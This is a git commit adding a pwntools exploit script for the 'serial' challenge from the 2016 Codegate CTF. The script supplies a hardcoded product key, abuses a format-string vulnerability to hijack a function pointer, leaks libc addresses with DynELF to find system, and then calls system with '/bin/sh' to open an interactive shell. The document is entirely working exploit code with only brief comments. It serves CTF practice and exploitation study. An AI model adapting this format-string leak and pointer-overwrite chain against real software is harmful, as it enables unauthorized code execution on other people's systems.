006435e4e0d27ac8b31ad3584c587a9e0005eccb
w0lfzhang <zswolfzhang@gmail.com>
2017-05-14 03:49:24 -0400

    add codegate-ctf

---
+++ 2016-codegate-ctf/exp.py
@@ -0,0 +1,51 @@
+#!/usr/bin python
+
+from pwn import *
+
+debug = 1
+if debug:
+    p = process('./serial')
+else:
+    pass
+
+def add(s):
+    p.recvuntil("choice >> ")
+    p.sendline('1')
+    p.recvuntil("insert >> ")
+    p.sendline(s)
+
+def remove(id):
+    p.recvuntil("choice >> ")
+    p.sendline('2')
+    p.recvuntil("choice>> ")
+    p.sendline(str(id))
+
+def dump(choice_id):
+    p.recvuntil("choice >> ")
+    p.sendline(choice_id)
+
+p.recvuntil("input product key: ")
+p.sendline('615066814080')
+
+printf_plt = 0x400790
+
+def leak(addr):
+    add("BB%13$sCC".ljust(24) + p64(printf_plt))
+    dump("3AAAAAAA"+p64(addr))
+    
+    p.recvuntil("BB")
+
+    data = p.recvuntil("CC")[:-2] + "\x00" #must adding \x00, becuase must leaking at least one byte data, however addr may be null
+    #print len(data)
+    remove(0)
+    return data
+
+d = DynELF(leak, elf = ELF('./serial'))
+system_addr = d.lookup("system", "libc.so")
+print "system_addr: " + hex(system_addr)
+
+add('/bin/sh;'.ljust(24) + p64(system_addr)) #attention, adding \x00 not working
+#gdb.attach(p)
+dump('3')
+
+p.interactive()
